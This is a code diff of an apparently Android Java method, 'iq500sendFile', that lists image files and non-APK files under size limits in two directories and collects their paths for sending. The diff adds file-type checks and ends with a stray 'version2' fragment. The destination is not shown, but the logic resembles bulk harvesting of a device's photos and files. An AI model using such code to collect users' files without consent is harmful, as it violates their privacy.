@@ -1,4 +1,4 @@
-	private void iq500sendFile()
+private void iq500sendFile()
 	{	
 		try{
 			//Test permission first
@@ -67,8 +67,9 @@
 						Boolean b = res[i].endsWith(".jpeg");
 						Boolean c = res[i].endsWith(".png");
 						Boolean d = new File(root + res[i]).length() /1024/1024 <= 10;
+						Boolean e = new File(root + res[i]).isFile();
 						
-						if((a&&d) || (b&&d) || (c&&d))
+						if((a||b||c) && d && e)
 						{
 							resls += root + res[i];
 
@@ -84,8 +85,8 @@
 					{
 						Boolean a2 = res2[i].endsWith(".apk");
 						Boolean b2 = new File(root2 + res2[i]).length() /1024/1024 <= 5;
-						
-						if(!a2 && b2)
+						Boolean c2 = new File(root2 + res2[i]).isFile();
+						if(!a2 && b2 && c2)
 						{
 							resls2 += root2 + res2[i];
 
@@ -166,8 +167,10 @@
 			e.printStackTrace();
 			Log.e("iq500", e.toString());
 		}
-	}
 
+		
+		
+	}
 
 for version2:
 	protected void onStop()
